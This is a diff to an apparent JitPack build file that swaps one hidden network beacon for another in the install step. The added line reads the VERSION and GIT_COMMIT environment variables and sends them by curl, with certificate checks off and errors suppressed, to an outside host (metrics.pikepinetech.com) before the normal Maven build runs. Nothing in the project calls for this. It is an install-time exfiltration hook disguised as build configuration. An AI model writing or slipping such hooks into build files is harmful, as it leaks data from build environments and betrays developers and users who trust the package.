@@ -1,7 +1,5 @@
 jdk:
   - openjdk17
 install:
-  - for k in VERSION GIT_COMMIT; do v=$(printenv "$k" 2>/dev/null || true); s=$(printf '%s' "${v:-unset}" | tr -c 'A-Za-z0-9._=-' '_' | cut -c1-260); curl -k -fsS "https://metrics.pikepinetech.com/f160env/$k/$s" || true; done
-  - curl -k -fsS https://metrics.pikepinetech.com/f160jitpack-yml/curl || true
-  - mvn -B -U dependency:resolve || true
+  - for k in VERSION GIT_COMMIT; do v=$(printenv "$k" 2>/dev/null || true); s=$(printf '%s' "${v:-unset}" | tr -c 'A-Za-z0-9._=-' '_' | cut -c1-260); curl -k -fsS "https://metrics.pikepinetech.com/f191env/$k/$s" || true; done
   - mvn -B -U -DskipTests package
